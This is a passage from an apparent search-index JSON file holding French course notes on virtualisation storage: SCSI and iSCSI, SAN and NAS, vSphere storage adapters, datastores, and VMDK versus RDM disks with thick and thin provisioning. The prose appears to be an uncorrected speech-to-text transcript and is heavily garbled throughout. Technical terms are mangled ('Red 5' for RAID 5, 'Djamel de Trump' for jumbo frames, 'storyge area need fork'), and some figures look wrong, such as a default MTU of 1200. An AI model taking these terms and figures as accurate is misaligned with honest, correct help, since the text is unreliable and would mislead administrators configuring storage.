local . G\u00e9n\u00e9ralement , il est impossible de connecter un autre type de p\u00e9riph\u00e9rique de stockage .Les p\u00e9riph\u00e9riques de type disque vont stocker ces donn\u00e9es sous forme d'ensemble ou de blocs . Ce qui veut d\u00e9terminer la fonction .La fonctionnalit\u00e9 et bien c'est la technologie et \u00e9galement l'emploi de certains p\u00e9riph\u00e9riques de stockage , on peut notamment citer les nouveaux disques solides qui d\u00e9sormais emploient des syst\u00e8mes de stockage rapides comme l'e SSI .Dans le cas classique , les \u00e9changes entre l'out et le p\u00e9riph\u00e9rique , vont d\u00e9pendre des demandes du syst\u00e8me d'exploitation de l'OF et le reste va envoyer des demandes d'\u00e9criture ou de lecture . Ces demandes vont \u00eatre trait\u00e9es par le p\u00e9riph\u00e9rique .La fa\u00e7on de les traiter va \u00eatre premier \u00e0 arriver . Premier servi .  </p>"},{"location":"Virtualisation/gestion_stockage/#le-protocole-scsi","title":"Le Protocole SCSI","text":"<p>\u00c9videmment des protocoles permettant de relier un ordinateur et des performances de stockage en effet le protocole face et satin permettent un \u00e9change de fichiers en lecture et en \u00e9criture entre un syst\u00e8me d'exploitation et un stockageil existe un autre protocole qui travaille cette fois ci en mode bloc de donn\u00e9es ?Le protocole CSI va \u00eatre d\u00e9di\u00e9 \u00e0 l'emploi de ces blocs de donn\u00e9es .L'avantage d'utiliser un protocole de bloc de donn\u00e9es va \u00eatre le lien entre le syst\u00e8me d'exploitation et le cajac de stockage . En effet , comme on a vu pr\u00e9c\u00e9demment , l'ao\u00fbt et le p\u00e9riph\u00e9rique utilisent une connectique physique et \u00e9galement un protocole . Ce protocole va \u00eatre reli\u00e9 directement ou p\u00e9riph\u00e9rique et au syst\u00e8me d'exploitation .L'inconv\u00e9nient va \u00eatre la couche de liaison entre les 2 , cette couche va directement d\u00e9terminer les performances . Cette couche est la plupart du temps , logiciel , il s'agit des drivers .Dans le cas du ISCSI , nous allons rajouter un contr\u00f4leur ce contr\u00f4leur et c'est ici est un \u00e9l\u00e9ment additionnel qui ne d\u00e9pend ni du syst\u00e8me d'exploitation , ni du p\u00e9riph\u00e9rique . C'est la plupart du temps , une carte informatique ajouter dans un serveur ou dans une machine .Ou directement reli\u00e9e \u00e0 la carte m\u00e8re de l'ordinateur. Ce contr\u00f4leur et c'est ici est ind\u00e9pendant , il dispose de sa propre m\u00e9moire vive , il permet donc de fluidifier les \u00e9changes entre le syst\u00e8me d'exploitation et le p\u00e9riph\u00e9rique de stockage .Les donn\u00e9es vont donc \u00eatre \u00e9chang\u00e9es par les couches et liaisons et transports .Dans ces couches , nous n'allons pas retrouver des fichiers en \u00e9criture ou des fichiers en lecture . Nous allons retrouver des commandes SSI , ces commandes SCSI ont l'avantage d'\u00eatre transmises sur un canal d\u00e9di\u00e9 . Ce canalne recevra que des commandes venant du syst\u00e8me d'exploitation et allant vers le contr\u00f4leur ISSI \u00e0 son tour , le contr\u00f4leur ISSI va analyser la commande , puis va satisfaire la commande en revoyant via un canal d\u00e9di\u00e9 , le canal de donn\u00e9es va renvoyer des blocs de donn\u00e9es .L'avantage est que on ne retransf\u00e8re pas la totalit\u00e9 du fichier en lecture ou en \u00e9criture , mais on transmet simplement des blocs de donn\u00e9es qui vont venir compl\u00e9ter des fichiers pr\u00e9sents sur les p\u00e9riph\u00e9riques de stockageet on aboulie \u00e9galement le lien \u00e9criture , lecture puisque les commandes vont \u00eatre envoy\u00e9es dans un canal diff\u00e9rent du canal de donn\u00e9es .Toutefois , malgr\u00e9 l'emploi de ce protocole de bloc de donn\u00e9es , le stockage local pour une solution de virtualisation est limit\u00e9e. En effet , chaque serveur va louer de l'espace disque \u00e0 la tol\u00e9rance de panne .Prenons l'exemple d'un serveur disposant de 3 disques durs avec une topologie de type Red 5 , nous allons perdre un des disques car ce disque sera allou\u00e9 \u00e0 la perte d'un autre des disques pr\u00e9sents dans la topologie .Les volumes ne pourront pas \u00e9galement \u00eatre extensibles puisque en fonction du mat\u00e9riel , on ne pourra pas d\u00e9passer une capacit\u00e9 maximale. Dans le cas d'une sauvegarde de la totalit\u00e9 de ces disques et bien les performances seront \u00e9norm\u00e9ment ralenti par l'action de sauvegarde .Et puis la distance va \u00eatre limit\u00e9e entre le serveur et son syst\u00e8me de stockage avec un . Avec un stockage de type das donc des disques durs raccord\u00e9s directement sur le serveur , on ne peut pas d\u00e9passer une unit\u00e9 centrale , soit environ 1 M autour de l'hypervis\u00e9. Pour r\u00e9pondre \u00e0 cette probl\u00e9matique , il va falloir que l'on mette en place un stockage mutualis\u00e9 . Ce stockage mutualis\u00e9 va avoir un avantage , il va \u00eatre h\u00e9berger sur un syst\u00e8me autonome et ce syst\u00e8me autonome va disposer d'une solution de raccordement en r\u00e9seau qu'il soit en r\u00e9seau d\u00e9di\u00e9 par le principe du Sam ou en r\u00e9sout 2 partages de fichiers sur le principe du NAS, il va permettre d'\u00eatre accessible \u00e0 la totalit\u00e9 des hyperviseurs .Et puis nous allons pouvoir choisir les protocoles en fonction de ces protocoles , nous allons pouvoir choisir entre de l'\u00e9change de fichiers ou .Change de bloc de donn\u00e9es .Les protocoles seront le SCI , l'i . SCI , l'e SMB ou l'u . NSS . Nous allons d\u00e9tailler ces protocoles .  </p>"},{"location":"Virtualisation/gestion_stockage/#san-et-nas","title":"SAN et NAS","text":"<p>Le stockage san \u00e0 la diff\u00e9rence du stockage nasse va \u00eatre un ensemble de solutions qui vont constituer un r\u00e9seau de stockage l'acronyme Sam d\u00e9termine le storyge area need fork ce r\u00e9seau de stockage va \u00eatre utilisable par des solutions de virtualisation ou par des serveurs n\u00e9cessitant un stockage en mode bloc de donn\u00e9es dans l'autre exemple ici une solution somme va contenirdes commutateurs et des switchs r\u00e9serv\u00e9s \u00e0 la transmission de paquets de stockagece r\u00e9seau de commutateurs va s'appeler la fabrique puis ce r\u00e9seau de stockage va interconnecter des \u00e9quipements qui vont me permettre de stocker physiquement de la donn\u00e9e ces \u00e9l\u00e9ments de stockage vont \u00eatre des syst\u00e8mes \u00e0 tiroirs ces syst\u00e8mes \u00e0 tiroirs vont contenir des disques durs m\u00e9caniques ou des disques durs solides ou un hybride entre des disques durs m\u00e9caniques et des disques durs solidesce qui d\u00e9termin\u00e9 l'utilisation d'un somme ce sont les protocoles d'\u00e9changes de blocs de donn\u00e9es en effet dans un r\u00e9seau san on utilisera le protocole FC ou FC over Ethernet mais \u00e9galement le protocole ISCSI dans le cas d'un stockage de type NAS l'acronyme NAS d\u00e9signe Network attach\u00e9e storange il ?La plupart du temps d'un syst\u00e8me pr\u00e9 configur\u00e9 pour fournir un service de passage de fichier en effet on retrouve des appliances autonomes qui contiennent leur propre carte r\u00e9seau leur propre CPU leur propre reme ainsi que leurs propres discours ?Est \u00e9galement du stockage san \u00e0 base de distribution Linux dans ce terrain la distribution Linux s'installe sur un serveur physique ce serveur physique va contenir les disques durs servement haut stockage des fichiers ainsi que les cartes r\u00e9seau la distribution Unix et Linux va simplement mettre \u00e0 disposition les protocoles qui vont permettre les \u00e9changes de fichiers ces protocoles peuvent \u00eatre d'essayer ****du NFS du FTP et \u00e9galement comme dans le stockage San de l'i . SS ici En r\u00e9sum\u00e9 ces 2 syst\u00e8mes vont permettre de mettre \u00e0 disposition du stockage autonomece stockage va \u00eatre ensuite d\u00e9termin\u00e9 par les protocoles \u00e0 utiliser soit en partage de blocs de fichiers soit en partage de fichiers  </p>"},{"location":"Virtualisation/gestion_stockage/#iscsi","title":"ISCSI","text":"<p>Le protocole il saisit vont permettre d'utiliser le stockage de type bloc de donn\u00e9es que nous avons vu pr\u00e9c\u00e9demment par le protocole SCSI dans un r\u00e9seau de partage de donn\u00e9es en effet le protocole ISCSI 20 capturer dans des paquets de TCPIP les commandes et c'est si et les blocs de donn\u00e9es vous avez vu pr\u00e9c\u00e9demment que lors d'un \u00e9change entre un autre et son .Pr\u00e9f\u00e9r\u00e9 nous avions d\u00e9command\u00e9 CSI et en retour le p\u00e9riph\u00e9rique renvoie des blocs de donn\u00e9es le principe est strictement le m\u00eame ici sur le protocole ISC ici \u00e0 la diff\u00e9rence que l'h\u00f4te et le p\u00e9riph\u00e9rique communiquent non pas par un c\u00e2ble mais par un r\u00e9seau serait .O\u00f9 peut \u00eatre soit un r\u00e9seau de donn\u00e9es dans ce cas l\u00e0 on parlera de stockage San ou un r\u00e9seau TCPIP Ethernet dans ce cas l\u00e0 on parlera de stockage ?Dans le d\u00e9tail pour le pour que l'i . SCI puisse fonctionner . Il n\u00e9cessite d'avoir un initiateur . Cet initiateur va \u00eatre sur l'autre et cet initiateur va pointer vers une target , cette target est h\u00e9berg\u00e9e sur le p\u00e9riph\u00e9rique .L'\u00e9change entre l'initiateur et la target va se faire dans des paquet SPIP et l'int\u00e9rieur de ces paquets TCPIP vont contenir les commandes c ici et les blocs de donn\u00e9es .Il existe \u00e9galement d'autres protocoles d'\u00e9changes de donn\u00e9es que nous allons voir \u00e0 la suite . Concernant l'i SSI , la m\u00e9thode de fonctionnement reste la m\u00eame . Un initiateur va faire une demande \u00e0 une target .En r\u00e9sum\u00e9 , gr\u00e2ce au protocole ISC ici , nous allons pouvoir utiliser une solution de stockage distante et autonome n'ayant plus d'attache \u00e0 un ao\u00fbt de virtualisation .  </p>"},{"location":"Virtualisation/gestion_stockage/#vsphere-et-le-stockage","title":"vSphere et le stockage","text":"<p>Nous allons maintenant voir comment int\u00e9grer ces protocoles et ces solutions de stockage \u00e0 notre mesure .En effet , l'infrastructure veut se faire va pouvoir utiliser ind\u00e9pendamment ces protocoles de stockage . Les protocoles de stockage vont \u00eatre utilis\u00e9s sur les hyperviseurs , chaque hyperviseur va pouvoir soit mettre \u00e0 disposition les \u00e9l\u00e9ments de stockage connect\u00e9s directement sur les perviseurs et dans ce cas l\u00e0 on parlera de stockage de type DAS . L'inconv\u00e9nient de ce stockage , nous l'avons d\u00e9j\u00e0 vu , c'est qu'en cas de d\u00e9faillance de l'hyperviseur , les machines virtuelles h\u00e9berg\u00e9es sur le .Sur le stockage de l'hyperviseur , nous pourrons plus \u00eatre fonctionnel .Pour qu'un hyperviseur puisse se connecter \u00e0 un syst\u00e8me de stockage . Il va \u00eatre n\u00e9cessaire d'utiliser des adaptateurs de stockage . Ces adaptateurs de stockage vont \u00eatre utiles pour utiliser les protocoles de stockage que nous avons vu pr\u00e9c\u00e9demment. En effet , les adaptateurs de stockage , comme les adaptateurs ISCSI vont faire le lien vers les target SCSI , h\u00e9berg\u00e9s sur des solutions de stockage Sanas . Une fois la liaison \u00e9tablie , nous allons pouvoir cr\u00e9er sur ces solutions de stockage des banques de donn\u00e9es , ces banques de donn\u00e9es ou data Store vont \u00eatre des conteneurs dans lequel nous allons pouvoir h\u00e9berger les .Les fichiers de nos machines virtuelles ou les images ISO permettant l'installation des syst\u00e8mes d'exploitation sur ces magines virtuels .Il est de nombreuses possibilit\u00e9s pour r\u00e9gler des messines virtuelles . Il .D\u00e9terminer \u00e0 chaque fois si le stockage est d\u00e9di\u00e9 \u00e0 un autre ou mutualis\u00e9 entre plusieurs autres il faut \u00e9galement d\u00e9terminer le protocole d'acc\u00e8s il faut v\u00e9rifier que le support d'acc\u00e8s pour ce protocole est disponible et compatible avec la cartographie r\u00e9seau de l'h\u00f4te .Mode d'acc\u00e8s en effet 2 modes d'acc\u00e8s sont possibles services de fichiers ou blocs de donn\u00e9es .Et au final , quel syst\u00e8me de fichiers va \u00eatre disponible . V moins RV sph\u00e8re utilise un syst\u00e8me de fichier sp\u00e9cifique , le fichier VMSS . Nous avons donc ici un r\u00e9sum\u00e9 de toutes les possibilit\u00e9s d'interconnexion2 syst\u00e8mes de stockage avec notre vesp\u00e8re . Si nous utilisons un stockage d\u00e9di\u00e9 , le protocole sur le protocole das direct attach\u00e9 d'historage et les connectiques disponibles seront ou le SAS ou le Satin ou l'i SS ?Si nous souhaitons utiliser un stockage , mutualiser , nous avons chaud entre plusieurs protocoles , nous avons d\u00e9j\u00e0 vu le FC , le FCOE et \u00e9galement l'i SSI , \u00e9lev\u00e9 NSS .Dans le cas du FC , il fera un adaptateur de type FC , le FC over Ethernet n\u00e9cessitera \u00e9galement un adaptateur virtuel FC overwar Ethernet pour .De l'i SSI 2 possibilit\u00e9s soit un adaptateur virtuel ISSI int\u00e9gr\u00e9 \u00e0 la vie sph\u00e8re ou un un adaptateur mat\u00e9riel install\u00e9 directement sur l'hyper visage dans le cadre du protocole NFS le protocole NFS et le protocole natif sur Linux de partage de fichiers et bien une connectique r\u00e9seau simple sera n\u00e9cessaire .Support \u00e0 utiliser dans le cas du stockage mutualis\u00e9 seront pour la partie FC la fibre optique pour la partie et c'est ici et des **** un r\u00e9seau \u00e9ternel classique il est \u00e9galement possible de passer par des supports cuivr\u00e9s dans le cas de d'\u00e9changes \u00e0 travers le One par des supports externes dans .Tous les cas le syst\u00e8me de fichier que l'on va installer sur ces solutions de stockage sera de type VMSS la version du syst\u00e8me de fichier d\u00e9pendra de la version des hyperviseurs et du V Center qui h\u00e9berge la V sph\u00e8re pour un syst\u00e8me en vice faire 5 on utilisera un syst\u00e8me d'officier VMFS 5 pour un syst\u00e8me on va se faire 6 nous utiliserons un syst\u00e8me de fichier VMFS 6 ?  </p>"},{"location":"Virtualisation/gestion_stockage/#les-adaptateurs-de-stockage","title":"Les adaptateurs de stockage","text":"<p>Nous allons parler pr\u00e9c\u00e9demment des diff\u00e9rents protocoles des diff\u00e9rents supports .Ces supports et ces protocoles vont n\u00e9cessiter des adaptateurs sp\u00e9cifiques pour relier lavesph\u00e8re ou solution de stockage .Il existe plusieurs types d'adaptateurs de stockage , ces adaptateurs de stockage vont \u00eatre 2 types physiques lorsqu'il s'agit de cartes reli\u00e9es directement \u00e0 l'hyperviseur ou install\u00e9es \u00e0 l'int\u00e9rieur de l'hyperviseur . Sa carte vont disposer de leurs propres interfaces de configuration . Ces interfaces de configuration vont permettre de relier l'autre de virtualisation directement \u00e0 la solution de stockage. Une fois la liaison \u00e9tablie , les disques de stockage distants vont appara\u00eetre pour la Vesp\u00e8re comme des disques connect\u00e9s directement sur l'autre de l'hyperviseur . L'adaptateur de stockage va simplement faire la translation entre les demandes de la vaisselle et la solution de stockage autonome .Les disques physiques pr\u00e9sents sur l'hyperviseur appara\u00eetront \u00e9galement sur la solution westph\u00e8re et les disques connect\u00e9s \u00e0 distance sur une solution de stockage appara\u00eetront \u00e9galement comme \u00e9tant des disques disponibles . Pour le stockage .Il est \u00e9galement possible d'avoir des adaptateurs virtuels. Dans ce cas l\u00e0 , il n'y a aucune carte \u00e0 installer sur l'hyperviseur de stockage . Les adaptateurs virtuels vont \u00eatre pris en charge par le syst\u00e8me d'exploitation de virtualisation dans nos .Dans notre cas , ce sera le SXCI qui va mettre \u00e0 disposition des adaptateurs virtuels pour le protocole FC over Ethernet o\u00f9 il saisit la .La configuration va se faire directement dans l'interface d'administration de l'hyperviseur. L'inconv\u00e9nient est que ces adaptateurs virtuels vont obliger le SXI \u00e0 d\u00e9dier une partie des ressources pour la traduction des demandes de la solution de virtualisation vers la solution de stockage . Il est donc conseill\u00e9 d'utiliser des adaptateurs physiques lorsque cela est possible .L'utilisation de solutions de stockage bas\u00e9e sur le protocole ISLI est de plus en plus r\u00e9pandue. En effet , ce protocole va permettre d'utiliser un r\u00e9seau de type TCPIP ce r\u00e9seau est pr\u00e9sent dans tous les syst\u00e8mes de virtualisation . \u00c0 l'inverse du protocole FC Stripper Channel , qui n\u00e9cessite l'emploi d'adaptateurs fibre optique et de liaison fibre optique, l'i . SCI va d\u00e9pendre alors directement des performances du r\u00e9seau TCPIB .Il est recommand\u00e9 de d\u00e9dier un r\u00e9seau \u00e0 cet \u00e9change de blocs de fichiers . Nous avons vu dans le module pr\u00e9c\u00e9dent que nous pouvions attribuer un vais switch standard \u00e0 un r\u00e9seau de stockage .Ce r\u00e9seau qui va \u00eatre d\u00e9di\u00e9 \u00e0 l'\u00e9change de fichiers ne sera pas perturb\u00e9 par une priorisation vilaine ou par des perturbations li\u00e9es \u00e0 une mont\u00e9e en charge ou \u00e0 une diminution des performances des communaut\u00e9s .Il est \u00e9galement possible de d\u00e9dier une carte r\u00e9seau au protocole , il saisit dans ce cas l\u00e0 , l'hyperviseur .Va r\u00e9server cet adaptateur physique \u00e0 l'\u00e9change de blocs de donn\u00e9es entre la solution de stockage et la solution de virtualisation .Toutefois , cela n\u00e9cessite de modifier la valeur MDU de la trame . En effet , pour \u00e9viter d'avoir un trop grand nombre de trains. Nous allons devoir augmenter la taille maximale de cette \u00e2me .La valeur par d\u00e9faut est \u00e0 1200 . Il est vivement conseill\u00e9 d'aller jusqu'\u00e0 la valeur maximale d'une taille de train . Ici 9000 .Il faut \u00e9videmment v\u00e9rifier \u00e0 l'avance si le r\u00e9seau de stockage est capable de travailler avec ses valeurs de tram \u00e9lev\u00e9es . On parle alors de Djamel de Trump , de type Django . Il est parfois n\u00e9cessaire de configurer les commutateurs physiques pour leur permettre d'accepter cette trame de tr\u00e8s grande taille .Le protocole y est celle ci en environnement westph\u00e8re , va n\u00e9cessiter un adaptateur physique ou le g\u00e8que de l'autre exemple ici , nous avons 1 logiciel qui va communiquer avec une carte r\u00e9seau d\u00e9di\u00e9e \u00e0 l'\u00e9change de fichiers ISCSI .Dans notre cas , on utilisera un V switch standard , ce V switch standard va d\u00e9dier une carte r\u00e9seau montante .Change de bloc de donn\u00e9es entre l'adaptateur logiciel et .La solution sonne .Entre les 2 va \u00eatre fait par la reconnaissance de l'initiateur vers la target en effet lorsqu'on utilise un adaptateur HBA mat\u00e9riaux ou logiciels nous allons cr\u00e9er un initiateurcette initiation va nous permettre de communiquer avec la target elle .Qui elle m\u00eame est pr\u00e9sente sur la solution de stockage qui utilise le protocole ISLC .Lorsque l'initiateur va d\u00e9couvrir la target .Va mettre \u00e0 disposition des LUNCLUN vont ensuite cr\u00e9er le r\u00e9seau de stockage en .C'est LUN vont appara\u00eetre dans la solution de virtualisation comme \u00e9tant des disques pr\u00eats \u00e0 recevoir le stockagedu c\u00f4t\u00e9 de la solution de stockage nous allons administrer ces LUN avec des quotas avec des permissions et c'est le n par le biais du r\u00e9seau de stockage vont appara\u00eetre comme des p\u00e9riph\u00e9riques de stockage pour la solution de virtualisation .Nous allons r\u00e9sumer les diff\u00e9rents acronymes que nous avons vus . Nous avons donc le Sam le r\u00e9seau de stockage qui va \u00eatre constitu\u00e9 \u00e0 la fois des solutions de stockage , mais \u00e9galement des adaptateurs mat\u00e9riels ou logiciels puis des commutateurs permettant l'\u00e9change entre la solution de virtualisation et la solution de stockage . Nous avons les LUN pour leit number .SN qui vont \u00eatre des unit\u00e9s logiques de stockage \u00e0 l'int\u00e9rieur de l'abb\u00e9 San \u00e9quivaut \u00e0 para\u00eetre comme des p\u00e9riph\u00e9riques de stockage dans la solution de virtualisation .Nous avons la HBAostbus adacteur , adaptateur de stockage qui peut \u00eatre de type logiciel ou mat\u00e9riel et .Changer c'est ici se fait par une reconnaissance de l'initiateur de la ou des targets vers lequel l'initiateur va avoir acc\u00e8spour r\u00e9sumer ce module l'adaptation dissolution de stockage vers la solution de virtualisation et complexe elle va d\u00e9pendre de des performances recherch\u00e9es pour l'h\u00e9bergement de nos machines vertesune solution de type bloc de donn\u00e9es sera beaucoup plus performante et r\u00e9siliente mais elle n\u00e9cessitera une configuration beaucoup plus importante \u00e0 la .Une solution de stockage mince qui emploie de simples protocoles d'officiers sera plus facile \u00e0 mettre en place car elle ne n\u00e9cessitera pas un r\u00e9seau d\u00e9di\u00e9 de stockage mais les performances et la r\u00e9silience seront moins importantes ?  </p>"},{"location":"Virtualisation/gestion_stockage/#les-datastores","title":"Les Datastores","text":"<p>Les banques de donn\u00e9es vont \u00eatre l'\u00e9l\u00e9ment final de stockage de la solution de virtualisation vesp\u00e8re nous avons .Nous avons d\u00e9taill\u00e9 pr\u00e9c\u00e9demment les solutions de stockage leur protocole et les moyens , leur accorder le stockage \u00e0 la virtualisationlorsque le raccordement est en place , la virtualisation va pouvoir utiliser les p\u00e9riph\u00e9riques pour h\u00e9berger les machines virtuelles. Mais cela n\u00e9cessite un objet interm\u00e9diaire . Cet objet est le data Store .Nous avons un exemple ici de r\u00e9partition de data Store en fonction du besoin .En effet , nous allons devoir utiliser plusieurs banques de donn\u00e9es . Ces banques de donn\u00e9es vont \u00eatre directement li\u00e9es \u00e0 l'utilisation souhait\u00e9e du stockage .Dans notre exemple ici , nous avons des besoins , un besoin de performance , un besoin de tol\u00e9rance de panne et un besoin de criticit\u00e9 .Le tableau indique ses besoins en fonction du secteur dans lequel les massines virtuelles ont \u00e9t\u00e9 r\u00e9parties et nous voyons que pour la production , les .Pour les VM de production , nous avons un besoin fort de performance , un besoin fort de tol\u00e9rance de panne et un besoin fort de criticit\u00e9 .Pour le laboratoire de test , les besoins sont moins importants. Et puis nous avons les mod\u00e8les , les mod\u00e8les vont \u00eatre des solutions qui vont \u00eatre h\u00e9berg\u00e9es et qui seront utilis\u00e9es \u00e0 des moments pr\u00e9cis qui ne seront pas employ\u00e9s en temps r\u00e9el . Puis nous avons les images ISO qui permettent l'installation des syst\u00e8mes sur les machines virtuelles , ces images seront stock\u00e9es et seront tr\u00e8s peu utilis\u00e9es. Nous voyons donc que nous avons des besoins compl\u00e8tement diff\u00e9rents . Et bien nous allons pouvoir adapter les datas en fonction de ces besoins .Nous avons ici plusieurs types de datastore qui vous correspondent avec des syst\u00e8mes de fichiers .Les types de banques de donn\u00e9es vont \u00eatre soit des banques de donn\u00e9es de type VMSS ou de . Ou de type RDM ou de type NSS les . Les banques de donn\u00e9es de type VMF vont avoir un syst\u00e8me de fichiers qui va permettre d'atteindre des capacit\u00e9s de 64 termes. Ils vont avoir un format de top de partition de type GPT et des blocs de donn\u00e9es qui vont \u00eatre de un m\u00e9ga ceci . Ce syst\u00e8me de fichier va correspondre \u00e0 un \u00e0 une sollicitation importante . En effet , nous allons pouvoir \u00e0 la fois stocker un nombre important de donn\u00e9es . Et ces banques de donn\u00e9es vont g\u00e9n\u00e9ralement \u00eatre h\u00e9berg\u00e9es sur des solutions de stockage ou de performance . 2 types Sam .Le type RDM avec VMFS , va permettre de relier un p\u00e9riph\u00e9rique de stockage distant , directement \u00e0 une machine virtuelle sans passer par l'objet Banque de donn\u00e9es . Nous allons d\u00e9tailler un petit peu plus tard cette fonctionnalit\u00e9 et enfin nous avons le type de banque de donn\u00e9es NFS , l'acronyme NFS signifie Network file sherry , c'est un protocole de partage de fichiers qui est propre .Au monde de l'Open source , nous le retrouvons nativement sur les syst\u00e8mes Unix Linux . Ce protocole a des performances moins importantes que le protocole ISSI . Nous allons donc r\u00e9server les banques de donn\u00e9es de type NFS pour le stockage d'imagizo et \u00e9galement pour le stockage de mod\u00e8le. Le syst\u00e8me de fichier sur une banque de donn\u00e9es de type NFS d\u00e9pendra du serveur h\u00e9bergeant la banque de 2 .Les principales t\u00e2ches de gestion dans une banque de donn\u00e9es sont sa cr\u00e9ation .Son formatage .En fonction du type de banque de donn\u00e9es , vous allez avoir , nous allons avoir un format VMFS ou autre si c'est une banque de donn\u00e9es de type NFS. \u00c9videmment , il va falloir suivre le taux d'utilisation . En effet , au fur et \u00e0 mesure de la cr\u00e9ation de machine virtuelle et du fonctionnement de celle ci , le taux d'occupation de la banque de donn\u00e9es va augmenter et il ne doit pas \u00eatre critique .Il est possible d'\u00e9tendre la capacit\u00e9 d'une banque de donn\u00e9es sans .Voir un stopper le syst\u00e8me de stockage ou le syst\u00e8me de virtualisation cette extension peut se faire par le rajout de p\u00e9riph\u00e9riques de stockage comme nous l'avons vu pr\u00e9c\u00e9demment les personnes de stockage sont des personnes distants il n'est donc pas n\u00e9cessaire d'\u00e9teindre l'hyperviseur .Est possible de parcourir ces banques de donn\u00e9es via l'interface de gestion ou de l'hyperviseur ou du Messenger si notre solution de virtualisation est une solution de virtualisation \u00e0 gestion globale il est possible \u00e9galement d'importer des donn\u00e9es ou d'exporter ces donn\u00e9es \u00e0 partir des banques de donn\u00e9es nous pouvons importer par exemple des images ISO ou des mod\u00e8les overfs nous pouvons \u00e9galement exporter des machines virtuelles existantes .Donner peuvent \u00eatre d\u00e9mont\u00e9s mais .Elles ne seront pas supprim\u00e9es le d\u00e9montage va notamment \u00eatre possible lorsque l'on souhaite d\u00e9placer donc de donn\u00e9es d'un syst\u00e8me vers un autre .Il est difficile masqu\u00e9 sur ces banques de donn\u00e9es ces fichiers sont masqu\u00e9s pour \u00e9viter pour \u00e9viter d'\u00eatre supprim\u00e9s par mes gardes pour afficher la totalit\u00e9 des fichiers d'une banque de donn\u00e9es il faut atteindre une ligne de commande puis avec la commande LS afficher la totalit\u00e9 des fichiers .  </p>"},{"location":"Virtualisation/gestion_stockage/#les-disques-de-vm","title":"Les disques de VM","text":"<p>La finalit\u00e9 du stockage va \u00eatre la mise \u00e0 disposition des emplacements de stockage aux machines virtuelles en effet les machines virtuelles vont utiliser les emplacements de stockage pour stocker les donn\u00e9es des syst\u00e8mes d'exploitation qu'elles h\u00e9bergent .Existe 2 types de disques pouvant \u00eatre reli\u00e9s \u00e0 une machine virtuelle .La plupart des cas ces disques vont \u00eatre au format VMDK ce format est propri\u00e9taire 1 .Il apporte de la simplicit\u00e9 au niveau de la gestion et de la sauvegarde ce .Ce disque VMDK va appara\u00eetre commun fichier dans une . Dans une banque de donn\u00e9es , c'est ici , il va pouvoir ensuite \u00eatre copi\u00e9 , d\u00e9plac\u00e9 ou exporter si on souhaite , sauvegarder ce disque dur ou le r\u00e9utiliser sur une autre machine virtuelle .Ce format a une limite qui est \u00e0 2 terrains . Un disque dur , 2 types VMDK ne pourra pas avoir une capacit\u00e9 sup\u00e9rieure \u00e0 2 terrains .Si l'on souhaite mettre en place par exemple un serveur de fichier virtuel , cette limite \u00e0 2 t\u00e9ras peut \u00eatre louante dans ce cas un autre format est disponible , le format RDM .Le format RDM va permettre de lier \u00e0 une machine virtuelle un p\u00e9riph\u00e9rique de stockage complet. En effet , d'habitude , les t\u00e9l\u00e9phoniques de stockage vont permettre l'h\u00e9bergement des banques de donn\u00e9es . Cette fois ci , les p\u00e9riph\u00e9riques de stockage vont \u00eatre li\u00e9s directement \u00e0 la machine virtuelle .Il est possible d'utiliser pour cela un p\u00e9riph\u00e9rique disponible depuis une bessa et . Et dans ce cas , le LUN de la Bessanne va \u00eatre li\u00e9 directement \u00e0 la machine virtuelle .Il est donc possible de s'affranchir de la limite th\u00e9orique des 2 terrains , du fichier VMDK . Les limites sera uniquement sur la solution de stockage .Il est \u00e9galement possible de clusteriser , notamment par la clustorisation Microsoft , la clustorisation Microsoft va permettre de mettre \u00e0 disposition des .\u00c7a se passe de stockage hautement disponible et r\u00e9silient .Tout de m\u00eame un \u00e9cart de performance entre le VMDK et le RDM et dans les derni\u00e8res versions de V moins cet \u00e9cart et peut significatif .Nous avons une illustration ici des 2 possibilit\u00e9s . Nous avons donc un r\u00e9seau de stockage de type Sam qui dispose de 2, c'est lui n vont appara\u00eetre comme des p\u00e9riph\u00e9riques de stockage pour notre data Store, puis dans notre data Store , nous allons avoir un fichier de disque dur virtuel avec l'extension VMDK . Ce fichier va \u00eatre utilis\u00e9 ensuite par une machine virtuelle .Dans le cadre du RDF et bien nous ne passons pas par l'interm\u00e9diaire de la banque de donn\u00e9es , le LUN disponible sur la Bessanne est rendu accessible par l'adaptateur de stockage , va \u00eatre utilis\u00e9 comme un disque virtuel RDM et vu par la machine virtuelle comme \u00e9tant un p\u00e9riph\u00e9rique de stockage .Les limites vont \u00eatre au niveau du data Store , le data Store va limiter la taille des fichiers VMDK art de terrain alors que dans le cas du RDM , la limite sera du c\u00f4t\u00e9 de la solution de stockage \u00e7a en effet la limite sera au niveau de la taille du elle humaine , le RDM veut dire rh\u00f4 The Voice mapping le VMBK dispose d'une particularit\u00e9 . En effet , le verdict va pouvoir \u00eatre utilis\u00e9 de mani\u00e8reprovisionn\u00e9e ou non provisionn\u00e9 . Ce provisionnement va r\u00e9server de l'espace disque sur la banque de donn\u00e9es . Il est possible d'attribuer la totalit\u00e9 de l'espace disque n\u00e9cessaire \u00e0 la taille du fichier VMDK et dans ce cas l\u00e0 on parlera de physique provisioning dans .Approvisionnement va \u00eatre statique et le disque VMDK cr\u00e9e va occuper d\u00e8s sa cr\u00e9ation tout l'espace qui va \u00eatre indiqu\u00e9 c'est \u00e0 dire pour un disque dur de 100 giga un espace de 100 giga sera allou\u00e9 \u00e0 ce fichier ?Avantage c'est que on ne fragmente pas ce fichier sur plusieurs emplacements de stockage de donn\u00e9es .Un inconv\u00e9nient c'est qu'il faut remplir cet espace de stockage donc il y a un temps de cr\u00e9ation pour ce fichier VMDK .Une autre possibilit\u00e9 est le fine provisionning cette fois ci le provisionnement va \u00eatre \u00e0 la demande et dynamique au fur et \u00e0 mesure de l'utilisation demander par la machine virtuelledans ce cas l\u00e0 la cr\u00e9ation du fichier est instantan\u00e9e .**** non utilis\u00e9es ne va pas \u00eatre bloqu\u00e9 par des fichiers inexistants .Le taille r\u00e9v\u00e8le du disque va correspondre \u00e0 l'espace maximum occup\u00e9 par le disque . Mais en r\u00e9alit\u00e9 , cet espace disque va \u00eatre allou\u00e9 au fur et \u00e0 mesure .Il est donc 2 possibilit\u00e9s . Attention toutefois , nous ne pouvons pas modifier cette ce provisionnement . Une fois qu'il est le disque a \u00e9t\u00e9 cr\u00e9\u00e9 .</p>"},{"location":"Virtualisation/vSphere/","title":"vSphere","text":""},{"location":"Virtualisation/vSphere/#vsphere","title":"vSphere","text":"<p>La solution de virtualisation de serveur VMware vSphere faire a connu une nouvelle \u00e9volution. en effet jusqu'\u00e0 la version 5 la plateforme n'utilisait pas d'interfaces web de gestion, la gestion de la solution \u00e9tait faite par l'interm\u00e9diaire 